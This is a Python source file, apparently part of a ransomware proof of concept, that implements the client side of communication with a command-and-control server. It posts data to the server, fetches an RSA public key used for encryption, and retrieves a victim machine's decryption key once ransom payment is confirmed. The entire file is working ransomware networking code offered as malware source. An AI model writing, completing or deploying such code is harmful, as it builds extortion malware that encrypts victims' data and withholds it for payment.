# Networking logic for ransomware PoC
import requests
from ransomware.config import AppConfig
from ransomware.logging import logger
from ransomware.exceptions import NetworkError

class NetworkClient:
    """
    Handles communication with the C2 server using HTTP requests.
    """
    def __init__(self, config: AppConfig):
        """
        Initialize the NetworkClient with configuration.
        """
        self.base_url = config.c2_server_url
        self.timeout = config.timeout

    def send_data(self, endpoint: str, data: dict) -> dict:
        """
        Send data to the C2 server at the specified endpoint.
        Raises NetworkError on failure.
        """
        url = f"{self.base_url}/{endpoint}"
        try:
            response = requests.post(url, json=data, timeout=self.timeout)
            response.raise_for_status()
            logger.info(f"Data sent to {url}")
            return response.json()
        except requests.RequestException as e:
            logger.error(f"Network error: {e}")
            raise NetworkError(str(e))

    def fetch_public_key(self) -> str:
        """
        Fetch the RSA public key from the C2 server.
        Returns the PEM-encoded public key as a string.
        """
        url = f"{self.base_url}/public_key"
        try:
            response = requests.get(url, timeout=self.timeout)
            response.raise_for_status()
            logger.info("Fetched RSA public key from C2 server")
            return response.json()["public_key"]
        except requests.RequestException as e:
            logger.error(f"Failed to fetch public key: {e}")
            raise NetworkError(str(e))

    def request_decrypt_key(self, machine_id: str) -> str:
        """
        Request the encrypted Fernet key for a machine after payment.
        Returns the base64-encoded RSA-encrypted Fernet key.
        """
        url = f"{self.base_url}/decrypt_key"
        try:
            response = requests.post(url, json={"machine_id": machine_id}, timeout=self.timeout)
            response.raise_for_status()
            logger.info(f"Received decrypt key response for {machine_id}")
            return response.json()["encrypted_key"]
        except requests.RequestException as e:
            logger.error(f"Failed to request decrypt key: {e}")
            raise NetworkError(str(e))

    def fetch_decrypted_key(self, machine_id: str) -> str:
        """
        Fetch the plaintext Fernet key from C2 after payment is confirmed.
        Returns the base64-encoded Fernet key as a string.
        """
        url = f"{self.base_url}/fetch_key"
        try:
            response = requests.post(url, json={"machine_id": machine_id}, timeout=self.timeout)
            response.raise_for_status()
            logger.info(f"Fetched decrypted key for {machine_id}")
            return response.json()["fernet_key"]
        except requests.RequestException as e:
            logger.error(f"Failed to fetch decrypted key: {e}")
            raise NetworkError(str(e)) 